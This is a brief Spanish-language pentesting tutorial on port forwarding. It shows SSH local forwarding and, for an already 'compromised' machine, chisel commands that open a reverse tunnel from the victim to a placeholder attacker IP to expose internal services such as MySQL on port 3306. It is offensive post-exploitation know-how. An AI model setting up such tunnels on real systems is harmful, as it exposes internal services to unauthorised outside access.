### Con SSH
Cuando tenemos acceso a una máquina, hay servicios que por algun motivo solo están corriendo para el "localhost". A veces nos interesa acceder a ese servicio ya que puede ser un panel web de administración, por ejemplo.

Supongamos una máquina que corre un servicio web en el puerto 9999 y lo queremos ver desde nuestro equipo en el puerto 8080.

```bash
ssh usuario@ip -L 8080:localhost:9999

# -L especifica redirección de puertos y funciona así
# local_port:remote_host:remote_port


```

Ahora basta con dirigirnos al navegador web de nuestra máquina atacante y dirigirnos a la URL **http://localhost:8080**

**Para Simplificar lo mejor es que tanto el puerto local como el remoto sean iguales, pero no siempre se podrá, porque puede que tengamos ese puerto ocupado**

### Cuando no tenemos credenciales SSH
si hemos comprometido la máquina pero no tenemos credenciales de SSH para hacer el típico port forwarding, podemos descargar **chisel** para ello y lo compartimos con la víctima.

En el atacante:
```bash
chisel server --reverse -p <puerto_escucha>
```

en la víctima:
```bash
chisel client <ip_atacante>:<puerto_escucha_del_atacante> R:<puerto_que_queremos_exponer>
```

**Si estamos por ejemplo queriendo exponer el 3306 de la víctima, y estamos a la escucha por el 1234 del atacante, realmente se nos está enviando el 3306 al atacante**

